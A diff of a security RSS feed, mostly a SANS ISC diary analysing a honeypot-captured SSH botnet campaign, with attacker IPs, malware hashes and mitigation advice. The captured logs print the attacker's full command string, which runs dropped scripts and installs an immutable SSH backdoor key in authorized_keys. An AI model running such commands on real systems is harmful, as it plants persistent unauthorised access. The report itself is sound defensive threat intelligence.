+			&lt;th scope="col"&gt;Timestamp(s)&lt;/th&gt;
+			&lt;th scope="col"&gt;Activity&lt;/th&gt;
+			&lt;th scope="col"&gt;Geographic Region&lt;/th&gt;
+		&lt;/tr&gt;
+	&lt;/thead&gt;
+	&lt;tbody&gt;
+		&lt;tr&gt;
+			&lt;td&gt;%%ip:196.251.70.219%%&lt;/td&gt;
+			&lt;td&gt;Primary Attacker&lt;/td&gt;
+			&lt;td&gt;2025-04-29T17:25:32Z&lt;/td&gt;
+			&lt;td&gt;Successful compromise, multi-architecture malware upload&lt;/td&gt;
+			&lt;td&gt;South Africa&lt;/td&gt;
+		&lt;/tr&gt;
+		&lt;tr&gt;
+			&lt;td&gt;%%ip:209.141.34.106%%&lt;/td&gt;
+			&lt;td&gt;Malware Host&lt;/td&gt;
+			&lt;td&gt;2025-04-29T07:24:22Z&lt;/td&gt;
+			&lt;td&gt;Hosting &amp;quot;PangaKenya&amp;quot; malware variants&lt;/td&gt;
+			&lt;td&gt;United States&lt;/td&gt;
+		&lt;/tr&gt;
+		&lt;tr&gt;
+			&lt;td&gt;%%ip:202.55.82.250%%&lt;/td&gt;
+			&lt;td&gt;Secondary C2&lt;/td&gt;
+			&lt;td&gt;2025-04-29T09:43:28Z&lt;/td&gt;
+			&lt;td&gt;Command &amp;amp; control server on port 60140 with fallback mechanisms&lt;/td&gt;
+			&lt;td&gt;Japan&lt;/td&gt;
+		&lt;/tr&gt;
+		&lt;tr&gt;
+			&lt;td&gt;%%ip:176.65.148.181%%&lt;/td&gt;
+			&lt;td&gt;Malware Execution&lt;/td&gt;
+			&lt;td&gt;2025-04-29T07:24:22Z&lt;/td&gt;
+			&lt;td&gt;Downloaded and executed &amp;quot;PangaKenya&amp;quot; malware&lt;/td&gt;
+			&lt;td&gt;Russia&lt;/td&gt;
+		&lt;/tr&gt;
+		&lt;tr&gt;
+			&lt;td&gt;%%ip:47.236.58.21%%&lt;/td&gt;
+			&lt;td&gt;Advanced Attacker&lt;/td&gt;
+			&lt;td&gt;2025-04-29T09:43:28Z&lt;/td&gt;
+			&lt;td&gt;Complex malware download&lt;/td&gt;
+			&lt;td&gt;China&lt;/td&gt;
+		&lt;/tr&gt;
+		&lt;tr&gt;
+			&lt;td&gt;%%ip:81.19.140.78%%&lt;/td&gt;
+			&lt;td&gt;Campaign Node&lt;/td&gt;
+			&lt;td&gt;2025-04-29T03:00:30Z -&amp;nbsp;&lt;br /&gt;
+			2025-04-29T04:22:42Z&lt;/td&gt;
+			&lt;td&gt;Multiple SSH key installation attempts&lt;/td&gt;
+			&lt;td&gt;Netherlands&lt;/td&gt;
+		&lt;/tr&gt;
+		&lt;tr&gt;
+			&lt;td&gt;%%ip:213.155.195.169%%&lt;/td&gt;
+			&lt;td&gt;Campaign Node&lt;/td&gt;
+			&lt;td&gt;2025-04-29T05:35:33Z -&lt;br /&gt;
+			2025-04-29T05:56:56Z&lt;/td&gt;
+			&lt;td&gt;Multiple SSH key installation attempts&lt;/td&gt;
+			&lt;td&gt;Poland&lt;/td&gt;
+		&lt;/tr&gt;
+		&lt;tr&gt;
+			&lt;td&gt;%%ip:203.239.31.150%%&lt;/td&gt;
+			&lt;td&gt;Campaign Node&lt;/td&gt;
+			&lt;td&gt;2025-04-29T05:40:24Z -&lt;br /&gt;
+			2025-04-29T07:19:11Z&lt;/td&gt;
+			&lt;td&gt;Multiple SSH key installation attempts&lt;/td&gt;
+			&lt;td&gt;South Korea&lt;/td&gt;
+		&lt;/tr&gt;
+		&lt;tr&gt;
+			&lt;td&gt;%%ip:67.10.184.83%%&lt;/td&gt;
+			&lt;td&gt;Campaign Node&lt;/td&gt;
+			&lt;td&gt;2025-04-29T11:05:53Z -&lt;br /&gt;
+			2025-04-29T14:03:12Z&lt;/td&gt;
+			&lt;td&gt;Multiple SSH key installation attempts&lt;/td&gt;
+			&lt;td&gt;United States&lt;/td&gt;
+		&lt;/tr&gt;
+		&lt;tr&gt;
+			&lt;td&gt;%%ip:135.148.27.57%%&lt;/td&gt;
+			&lt;td&gt;Campaign Node&lt;/td&gt;
+			&lt;td&gt;2025-04-29T01:36:35Z&lt;/td&gt;
+			&lt;td&gt;SSH key installation attempt&lt;/td&gt;
+			&lt;td&gt;Canada&lt;/td&gt;
+		&lt;/tr&gt;
+		&lt;tr&gt;
+			&lt;td&gt;%%ip:45.55.187.1%%&lt;/td&gt;
+			&lt;td&gt;Campaign Node&lt;/td&gt;
+			&lt;td&gt;2025-04-29T02:10:37Z&lt;/td&gt;
+			&lt;td&gt;SSH key installation attempt&lt;/td&gt;
+			&lt;td&gt;United States&lt;/td&gt;
+		&lt;/tr&gt;
+		&lt;tr&gt;
+			&lt;td&gt;%%ip:120.133.83.199%%&lt;/td&gt;
+			&lt;td&gt;Campaign Node&lt;/td&gt;
+			&lt;td&gt;2025-04-29T03:34:04Z&lt;/td&gt;
+			&lt;td&gt;SSH key installation attempt&lt;/td&gt;
+			&lt;td&gt;China&lt;/td&gt;
+		&lt;/tr&gt;
+		&lt;tr&gt;
+			&lt;td&gt;%%ip:77.105.181.82%%&lt;/td&gt;
+			&lt;td&gt;Campaign Node&lt;/td&gt;
+			&lt;td&gt;2025-04-29T03:46:59Z&lt;/td&gt;
+			&lt;td&gt;SSH key installation attempt&lt;/td&gt;
+			&lt;td&gt;Russia&lt;/td&gt;
+		&lt;/tr&gt;
+		&lt;tr&gt;
+			&lt;td&gt;%%ip:154.219.99.245%%&lt;/td&gt;
+			&lt;td&gt;Campaign Node&lt;/td&gt;
+			&lt;td&gt;2025-04-29T04:07:54Z&lt;/td&gt;
+			&lt;td&gt;SSH key installation attempt&lt;/td&gt;
+			&lt;td&gt;Poland&lt;/td&gt;
+		&lt;/tr&gt;
+		&lt;tr&gt;
+			&lt;td&gt;%%ip:176.109.0.30%%&lt;/td&gt;
+			&lt;td&gt;Campaign Node&lt;/td&gt;
+			&lt;td&gt;2025-04-29T04:12:27Z&lt;/td&gt;
+			&lt;td&gt;SSH key installation attempt&lt;/td&gt;
+			&lt;td&gt;Russia&lt;/td&gt;
+		&lt;/tr&gt;
+		&lt;tr&gt;
+			&lt;td&gt;%%ip:167.99.128.177%%&lt;/td&gt;
+			&lt;td&gt;Campaign Node&lt;/td&gt;
+			&lt;td&gt;2025-04-29T04:38:22Z&lt;/td&gt;
+			&lt;td&gt;SSH key installation attempt&lt;/td&gt;
+			&lt;td&gt;United Kingdom&lt;/td&gt;
+		&lt;/tr&gt;
+		&lt;tr&gt;
+			&lt;td&gt;%%ip:211.253.10.96%%&lt;/td&gt;
+			&lt;td&gt;Campaign Node&lt;/td&gt;
+			&lt;td&gt;2025-04-29T04:48:26Z&lt;/td&gt;
+			&lt;td&gt;SSH key installation attempt&lt;/td&gt;
+			&lt;td&gt;South Korea&lt;/td&gt;
+		&lt;/tr&gt;
+		&lt;tr&gt;
+			&lt;td&gt;%%ip:101.126.90.24%%&lt;/td&gt;
+			&lt;td&gt;Campaign Node&lt;/td&gt;
+			&lt;td&gt;2025-04-29T04:57:37Z&lt;/td&gt;
+			&lt;td&gt;SSH key installation attempt&lt;/td&gt;
+			&lt;td&gt;Japan&lt;/td&gt;
+		&lt;/tr&gt;
+		&lt;tr&gt;
+			&lt;td&gt;%%ip:138.197.116.43%%&lt;/td&gt;
+			&lt;td&gt;Campaign Node&lt;/td&gt;
+			&lt;td&gt;2025-04-29T05:21:44Z&lt;/td&gt;
+			&lt;td&gt;SSH key installation attempt&lt;/td&gt;
+			&lt;td&gt;Canada&lt;/td&gt;
+		&lt;/tr&gt;
+		&lt;tr&gt;
+			&lt;td&gt;%%ip:14.103.123.75%%&lt;/td&gt;
+			&lt;td&gt;Campaign Node&lt;/td&gt;
+			&lt;td&gt;2025-04-29T09:12:16Z&lt;/td&gt;
+			&lt;td&gt;SSH key installation attempt&lt;/td&gt;
+			&lt;td&gt;China&lt;/td&gt;
+		&lt;/tr&gt;
+		&lt;tr&gt;
+			&lt;td&gt;%%ip:182.40.195.233%%&lt;/td&gt;
+			&lt;td&gt;Campaign Node&lt;/td&gt;
+			&lt;td&gt;2025-04-29T09:23:54Z&lt;/td&gt;
+			&lt;td&gt;SSH key installation attempt&lt;/td&gt;
+			&lt;td&gt;China&lt;/td&gt;
+		&lt;/tr&gt;
+		&lt;tr&gt;
+			&lt;td&gt;%%ip:117.9.170.239%%&lt;/td&gt;
+			&lt;td&gt;Campaign Node&lt;/td&gt;
+			&lt;td&gt;2025-04-29T10:06:41Z&lt;/td&gt;
+			&lt;td&gt;SSH key installation attempt&lt;/td&gt;
+			&lt;td&gt;China&lt;/td&gt;
+		&lt;/tr&gt;
+	&lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p style="text-align: center;"&gt;&lt;strong&gt;Fiture 4:Visualisation showing repeated access attempts and persistence mechanisms.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+
+&lt;h3&gt;Attack Infrastructure Analysis&lt;/h3&gt;
+
+&lt;p&gt;The table reveals several key insights:&lt;/p&gt;
+
+&lt;ol&gt;
+	&lt;li&gt;&lt;strong&gt;Global Coordination&lt;/strong&gt;: The attack campaign spans at least 9 countries across Asia, Europe, North America, and Africa.&lt;/li&gt;
+	&lt;li&gt;&lt;strong&gt;Infrastructure Hierarchy&lt;/strong&gt;:
+	&lt;ul&gt;
+		&lt;li&gt;Primary infrastructure for sophisticated attacks (3 key IPs)&lt;/li&gt;
+		&lt;li&gt;Distributed secondary nodes attempting simpler SSH key installations (19+ IPs)&lt;/li&gt;
+	&lt;/ul&gt;
+	&lt;/li&gt;
+	&lt;li&gt;&lt;strong&gt;Temporal Pattern&lt;/strong&gt;: Active operation throughout April 29, 2025, suggesting automation.&lt;/li&gt;
+	&lt;li&gt;&lt;strong&gt;Geographic Clustering&lt;/strong&gt;:
+	&lt;ul&gt;
+		&lt;li&gt;Asian cluster: China, Japan, South Korea (7+ IPs)&lt;/li&gt;
+		&lt;li&gt;European cluster: Russia, Poland, UK, Netherlands (5+ IPs)&lt;/li&gt;
+		&lt;li&gt;North American cluster: US, Canada (4+ IPs)&lt;/li&gt;
+		&lt;li&gt;African presence: South Africa (1 IP - primary attacker)&lt;/li&gt;
+	&lt;/ul&gt;
+	&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h3&gt;Key Infrastructure Providers&lt;/h3&gt;
+
+&lt;ol&gt;
+	&lt;li&gt;&lt;strong&gt;Primary Malware Distribution Server (%%ip:209.141.34.106%%)&lt;/strong&gt;:
+
+	&lt;ul&gt;
+		&lt;li&gt;Hosted by FranTech Solutions - a US-based hosting provider&lt;/li&gt;
+		&lt;li&gt;Located in Las Vegas, Nevada, United States&lt;/li&gt;
+		&lt;li&gt;Operating under AS53667&lt;/li&gt;
+		&lt;li&gt;Known for offering bulletproof hosting services that are often used by threat actors&lt;/li&gt;
+	&lt;/ul&gt;
+	&lt;/li&gt;
+	&lt;li&gt;&lt;strong&gt;Secondary C2 Server (%%ip:202.55.82.250%%)&lt;/strong&gt;:
+	&lt;ul&gt;
+		&lt;li&gt;Located in Asia&lt;/li&gt;
+		&lt;li&gt;Used for distributing the &amp;quot;linux&amp;quot; binary malware with fallback download methods&lt;/li&gt;
+	&lt;/ul&gt;
+	&lt;/li&gt;
+	&lt;li&gt;&lt;strong&gt;Attacker Origin (%%ip:196.251.70.219%%)&lt;/strong&gt;:
+	&lt;ul&gt;
+		&lt;li&gt;South African IP address&lt;/li&gt;
+		&lt;li&gt;Used for the most sophisticated attack that deployed multi-architecture binaries&lt;/li&gt;
+	&lt;/ul&gt;
+	&lt;/li&gt;
+	&lt;li&gt;&lt;strong&gt;Operational Significance: &lt;/strong&gt;The use of globally distributed IPs for similar attack patterns strongly suggests a sophisticated botnet operation rather than isolated threat actors.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;This comprehensive geographic distribution indicates the attack campaign likely utilized compromised infrastructure or proxy networks to obfuscate its true origin while conducting a coordinated global attack campaign.&lt;/p&gt;
+
+&lt;h3&gt;Malware File Hashes (SHA-256)&lt;/h3&gt;
+
+&lt;ul&gt;
+	&lt;li&gt;811cd6ebeb9e2b7438ad9d7c382db13c1c04b7d520495261093af51797f5d4cc - KKveTTgaAAsecNNaaaa.x86_64&lt;/li&gt;
+	&lt;li&gt;9ac2e308b0b30354575bba88169283fa7439d34937a148ccb390bcec3c6e296b -&amp;nbsp;KKveTTgaAAsecNNaaaa.x86&lt;/li&gt;
+	&lt;li&gt;2ef6bb55a79d81fbda6d574456a8c187f610c5ae2ddca38e32cf7cc50912b0bf - redtail.arm7&lt;/li&gt;
+	&lt;li&gt;fc8730fbe87bcbdc093a1ffbcb0028ccb4c24638e55d13fd853b07574f4cbe4a - redtail.arm8&lt;/li&gt;
+	&lt;li&gt;7780e72f7dea978946d4615c8db1b239d3e2c742cfc8be2934006b1fd6071110 - redtail.i686&lt;/li&gt;
+	&lt;li&gt;b6ee8e08f1d4992ca85770e6883c1d2206ebbaf42f99d99aba0e26278de8bffb - redtail.x86_64&lt;/li&gt;
+	&lt;li&gt;d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e - clean.sh&lt;/li&gt;
+	&lt;li&gt;3b15778595cef00d1a51035dd4fd65e6be97e73544cb1899f40aec4aaa0445ae - setup.sh&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3&gt;SSH Backdoor Information&lt;/h3&gt;
+
+&lt;ul&gt;
+	&lt;li&gt;Key fingerprint: 2048 SHA256:78gkKoLYeUW62etRipAiAw2jImcwCMnvC5BO9+3mOtY&lt;/li&gt;
+	&lt;li&gt;Key comment: rsa-key-20230629&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3&gt;Malicious Commands&lt;/h3&gt;
+
+&lt;ul&gt;
+	&lt;li&gt;chattr -ia ~/.ssh/authorized_keys&lt;/li&gt;
+	&lt;li&gt;chattr +ai ~/.ssh/authorized_keys&lt;/li&gt;
+	&lt;li&gt;Creation of file /tmp/.opass with password content&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3&gt;HASSH Fingerprint&lt;/h3&gt;
+
+&lt;p&gt;0a07365cc01fa9fc82608ba4019af499 (SSH-2.0-Go client)&lt;/p&gt;
+
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+
+&lt;pre&gt;
+&lt;code class="language-bash"&gt;{
+ "eventid": "cowrie.command.input",
+ "input": "chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.s
+h; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo \"ssh-rsa AAAA
+B3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7Ag
+vfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPX
+xg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrv
+aRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSm
+dw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1hcEUslEf/zevIcX8+6H7kUM
+Rr rsa-key-20230629\" &amp;gt; ~/.ssh/authorized_keys; chattr +ai ~/.ssh/authorized_keys; unam
+e -a; echo -e \"\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A\"; ",
+ "message": "CMD: chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; s
+h setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo \"ssh-r
+sa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7ne
+NVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEa
+DAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMt
+PAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfd
+mHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1hcEUslEf/zevIcX
+8+6H7kUMRr rsa-key-20230629\" &amp;gt; ~/.ssh/authorized_keys; chattr +ai ~/.ssh/authorized_
+keys; uname -a; echo -e \"\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A\"; ",
+ "sensor": "",
+ "timestamp": "2025-04-29T17:25:48.682372Z",
+ "src_ip": "196.251.70.219",
+ "session": "90db1182d123"
+}
+
+{
+ "eventid": "cowrie.client.kex",
+ "hassh": "0a07365cc01fa9fc82608ba4019af499",
+ "hasshAlgorithms": "curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nist
+p256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellm
+an-group14-sha1,ext-info-c,kex-strict-c-v00@openssh.com;aes128-gcm@openssh.com,ae
+s256-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes25
+6-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2
+-256,hmac-sha2-512,hmac-sha1,hmac-sha1-96;none",
+ "kexAlgs": [
+ "curve25519-sha256",
+ "curve25519-sha256@libssh.org",
+ "ecdh-sha2-nistp256",
+ "ecdh-sha2-nistp384",
+ "ecdh-sha2-nistp521",
+ "diffie-hellman-group14-sha256",
+ "diffie-hellman-group14-sha1",
+ "ext-info-c",
+ "kex-strict-c-v00@openssh.com"
+ ],
+ "keyAlgs": [
+ "rsa-sha2-256-cert-v01@openssh.com",
+ "rsa-sha2-512-cert-v01@openssh.com",
+ "ssh-rsa-cert-v01@openssh.com",
+ "ssh-dss-cert-v01@openssh.com",
+ "ecdsa-sha2-nistp256-cert-v01@openssh.com",
+ "ecdsa-sha2-nistp384-cert-v01@openssh.com",
+ "ecdsa-sha2-nistp521-cert-v01@openssh.com",
+ "ssh-ed25519-cert-v01@openssh.com",
+ "ecdsa-sha2-nistp256",
+ "ecdsa-sha2-nistp384",
+ "ecdsa-sha2-nistp521",
+ "rsa-sha2-256",
+ "rsa-sha2-512",
+ "ssh-rsa",
+ "ssh-dss",
+ "ssh-ed25519"
+ ],
+ "encCS": [
+ "aes128-gcm@openssh.com",
+ "aes256-gcm@openssh.com",
+ "chacha20-poly1305@openssh.com",
+ "aes128-ctr",
+ "aes192-ctr",
+ "aes256-ctr"
+ ],
+ "macCS": [
+ "hmac-sha2-256-etm@openssh.com",
+ "hmac-sha2-512-etm@openssh.com",
+ "hmac-sha2-256",
+ "hmac-sha2-512",
+ "hmac-sha1",
+ "hmac-sha1-96"
+ ],
+ "compCS": [
+ "none"
+ ],
+ "langCS": [
+ ""
+ ],
+ "message": "SSH client hassh fingerprint: 0a07365cc01fa9fc82608ba4019af499",
+ "sensor": "",
+ "timestamp": "2025-04-29T17:25:32.857270Z",
+ "src_ip": "196.251.70.219",
+ "session": "90db1182d123"
+}&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;
+&lt;code class="language-bash"&gt;===============================================
+HASSH Threat Intelligence: 0a07365cc01fa9fc82608ba4019af499
+===============================================
+Client: SSH-2.0-Go
+Algorithm suite: curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,
+ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-gr
+oup14-sha1,ext-info-c,kex-strict-c-v00@openssh.com
+Encryption algorithms: aes128-gcm@openssh.com,aes256-gcm@openssh.com,chacha20-
+poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr
+Detected attack patterns: Automated brute force, credential stuffing
+Known threat actors: Associated with mass scanning botnets
+Source IP: 196.251.70.219 (South Africa)
+===============================================
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+
+&lt;h2&gt;Mitigation Recommendations&lt;/h2&gt;
+
+&lt;p&gt;Based on the attack techniques observed, here are key recommendations to protect your systems:&lt;/p&gt;
+
+&lt;h3&gt;Secure Authentication&lt;/h3&gt;
+
+&lt;ol&gt;
+	&lt;li&gt;Disable password-based SSH authentication in favor of key-based authentication&lt;/li&gt;
+	&lt;li&gt;Implement strong password policies if password authentication must be enabled&lt;/li&gt;
+	&lt;li&gt;Consider implementing SSH certificate authentication for enhanced security&lt;/li&gt;
+	&lt;li&gt;Implement multi-factor authentication where possible&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h3&gt;Network Security&lt;/h3&gt;
+
+&lt;ol&gt;
+	&lt;li&gt;Implement IP allowlisting for administrative access when feasible&lt;/li&gt;
+	&lt;li&gt;Use a properly configured firewall to limit SSH access to known networks&lt;/li&gt;
+	&lt;li&gt;Consider using a VPN as an additional protection layer for remote access&lt;/li&gt;
+	&lt;li&gt;Implement network segmentation to contain potential breaches&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h3&gt;System Hardening&lt;/h3&gt;
+
+&lt;ol&gt;
+	&lt;li&gt;Regularly update and patch systems&lt;/li&gt;
+	&lt;li&gt;Remove or disable unnecessary services and software&lt;/li&gt;
+	&lt;li&gt;Implement the principle of least privilege for all accounts&lt;/li&gt;
+	&lt;li&gt;Use intrusion detection/prevention systems to identify suspicious activity&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h3&gt;Monitoring and Detection&lt;/h3&gt;
+
+&lt;ol&gt;
+	&lt;li&gt;Monitor for unauthorized SSH keys in authorized_keys files&lt;/li&gt;
+	&lt;li&gt;Watch for unexpected file attribute changes (especially immutable flags)&lt;/li&gt;
+	&lt;li&gt;Monitor for connections to known malicious IP addresses&lt;/li&gt;
+	&lt;li&gt;Implement file integrity monitoring for critical system files&lt;/li&gt;
+	&lt;li&gt;Develop and rehearse an incident response plan&lt;/li&gt;
+	&lt;li&gt;Maintain offline backups of critical systems and data&lt;/li&gt;
+	&lt;li&gt;Establish a security baseline to help identify anomalies&lt;/li&gt;
+	&lt;li&gt;Consider using honeypots to detect and study attack techniques&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+
+&lt;h2&gt;Conclusion: Learning from Adversaries&lt;/h2&gt;
+
+&lt;p&gt;What makes this attack campaign particularly concerning isn't just its automation, but its global coordination. The logs reveal identical attack patterns originating from dozens of distinct IP addresses across different continents - from South America to Asia to Europe - all using the same SSH key, command sequences, and malware distribution infrastructure. This suggests we're observing a well-organised botnet operation rather than isolated opportunistic attacks.&lt;/p&gt;
+
+&lt;p&gt;The attackers' use of architecture-specific malware binaries (arm7, arm8, i686, x86_64) indicates they're specifically targeting the growing Internet of Things ecosystem alongside traditional servers. Most concerning is how the attackers attempt to establish persistence through multiple redundant methods like SSH backdoors with immutable attributes, crontab modifications, and likely rootkit components in the 'redtail' binaries.&lt;/p&gt;
+
+&lt;p&gt;For defenders, this underlines the critical importance of monitoring SSH authentication logs, implementing proper key management, and deploying behavioral analysis tools that can detect the distinctive pattern of file uploads and attribute modifications that precede full compromise. As these attack patterns continue to evolve, sharing this type of detailed analysis becomes increasingly valuable for the broader security community.&lt;/p&gt;
+
+&lt;p&gt;This honeypot capture represents a valuable learning opportunity. The attackers demonstrated an automated approach to system compromise, using multiple fallback mechanisms and persistence techniques. They came prepared with malware variants for different architectures and took steps to hide their activities.&lt;/p&gt;
+
+&lt;p&gt;The complexity and automation in this attack highlight an important reality of modern cybersecurity: many attacks are not targeted but opportunistic, using automated tools to scan for and exploit vulnerable systems at scale. A single exposed system with weak credentials can be discovered and compromised within minutes. By studying these attacks in controlled environments, we can better understand adversary techniques and improve our defensive postures. The honeypot serves not just as a detection mechanism but as a cybersecurity training tool, providing real-world examples of the threats systems face daily.&lt;/p&gt;
+
+&lt;p&gt;This comprehensive attack analysis was created entirely using Notion as my central workspace before exporting to PDF. Notion's flexible database capabilities made organising and parsing through the complex honeypot logs significantly more efficient.&lt;/p&gt;
+
+&lt;p&gt;For anyone conducting similar security research, Notion offers a surprisingly powerful environment for both collaborative analysis and professional report preparation [7].&lt;/p&gt;
+
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+
+&lt;p&gt;[1] &lt;a href="https://www.sans.edu/cyber-security-programs/bachelors-degree/" target="_blank"&gt;https://www.sans.edu/cyber-security-programs/bachelors-degree/&lt;/a&gt;&lt;br /&gt;
+[2] &lt;a href="https://isc.sans.edu/honeypot.html" target="_blank"&gt;https://isc.sans.edu/honeypot.html&lt;/a&gt;&lt;br /&gt;
+[3] &lt;a href="https://www.virustotal.com/gui/file/2ef6bb55a79d81fbda6d574456a8c187f610c5ae2ddca38e32cf7cc50912b0bf" target="_blank"&gt;https://www.virustotal.com/gui/file/2ef6bb55a79d81fbda6d574456a8c187f610c5ae2ddca38e32cf7cc50912b0bf&lt;/a&gt;&lt;br /&gt;
+[4] &lt;a href="https://www.virustotal.com/gui/file/fc8730fbe87bcbdc093a1ffbcb0028ccb4c24638e55d13fd853b07574f4cbe4a" target="_blank"&gt;https://www.virustotal.com/gui/file/fc8730fbe87bcbdc093a1ffbcb0028ccb4c24638e55d13fd853b07574f4cbe4a&lt;/a&gt;&lt;br /&gt;
+[5] &lt;a href="https://www.virustotal.com/gui/file/7780e72f7dea978946d4615c8db1b239d3e2c742cfc8be2934006b1fd6071110" target="_blank"&gt;https://www.virustotal.com/gui/file/7780e72f7dea978946d4615c8db1b239d3e2c742cfc8be2934006b1fd6071110&lt;/a&gt;&lt;br /&gt;
+[6] &lt;a href="https://www.virustotal.com/gui/file/b6ee8e08f1d4992ca85770e6883c1d2206ebbaf42f99d99aba0e26278de8bffb" target="_blank"&gt;https://www.virustotal.com/gui/file/b6ee8e08f1d4992ca85770e6883c1d2206ebbaf42f99d99aba0e26278de8bffb&lt;/a&gt;&lt;br /&gt;
+[7] &lt;a href="https://www.notion.so" target="_blank"&gt;https://www.notion.so&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+
+&lt;p&gt;--&lt;br /&gt;
+Jesse La Grew&lt;br /&gt;
+Handler&lt;/p&gt;
+
+ 
+ (c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</content:encoded><guid isPermaLink="false">https://isc.sans.edu/diary/rss/32024</guid></item><item><title>TIOBE Programming Index News June 2025: SQL Falls to Record Low Popularity</title><link>https://www.techrepublic.com/article/news-tiobe-programming-index-analysis-june-2025/</link><description>SQL has faded in popularity as people working in the field of AI switch to NoSQL databases.</description><guid isPermaLink="false">https://www.techrepublic.com/?p=4311455</guid><category>Artificial Intelligence</category><category>Developer</category><category>News</category><category>Software</category></item><item><title>Inside a Dark Adtech Empire Fed by Fake CAPTCHAs</title><link>https://krebsonsecurity.com/2025/06/inside-a-dark-adtech-empire-fed-by-fake-captchas/</link><description>Late last year, security researchers made a startling discovery: Kremlin-backed disinformation campaigns were bypassing moderation on social media platforms by leveraging the same malicious advertising technology that powers a sprawling ecosystem of online hucksters and website hackers. A new report on the fallout from that investigation finds this dark ad tech industry is far more resilient and incestuous than previously known.</description><content:encoded>&lt;p&gt;Late last year, security researchers made a startling discovery: Kremlin-backed disinformation campaigns were bypassing moderation on social media platforms by leveraging the same malicious advertising technology that powers a sprawling ecosystem of online hucksters and website hackers. A new report on the fallout from that investigation finds this dark ad tech industry is far more resilient and incestuous than previously known.&lt;/p&gt;
 &lt;div class="wp-caption aligncenter" id="attachment_71492" style="width: 760px;"&gt;&lt;img alt="" class=" wp-image-71492" height="422" src="https://krebsonsecurity.com/wp-content/uploads/2025/06/maladtech.png" width="750" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-71492"&gt;Image: Infoblox.&lt;/p&gt;&lt;/div&gt;
 &lt;p&gt;In November 2024, researchers at the security firm &lt;strong&gt;Qurium&lt;/strong&gt; published an investigation into &amp;#8220;&lt;a href="https://www.cybercom.mil/Media/News/Article/3895345/russian-disinformation-campaign-doppelgnger-unmasked-a-web-of-deception/" rel="noopener" target="_blank"&gt;Doppelganger&lt;/a&gt;,&amp;#8221; a disinformation network that promotes pro-Russian narratives and infiltrates Europe&amp;#8217;s media landscape by pushing fake news through a network of cloned websites.&lt;/p&gt;
 &lt;p&gt;Doppelganger campaigns use specialized links that bounce the visitor&amp;#8217;s browser through a long series of domains before the fake news content is served. Qurium &lt;a href="https://www.qurium.org/forensics/when-kehr-meets-vextrio/" rel="noopener" target="_blank"&gt;found&lt;/a&gt; Doppelganger relies on a sophisticated &amp;#8220;domain cloaking&amp;#8221; service, a technology that allows websites to present different content to search engines compared to what regular visitors see. The use of cloaking services helps the disinformation sites remain online longer than they otherwise would, while ensuring that only the targeted audience gets to view the intended content.&lt;/p&gt;
@@ -5057,14 +5936,7 @@ Senior handler&lt;br /&gt;
 &lt;a href="http://blog.DidierStevens.com"&gt;blog.DidierStevens.com&lt;/a&gt;&lt;/p&gt;
 
  
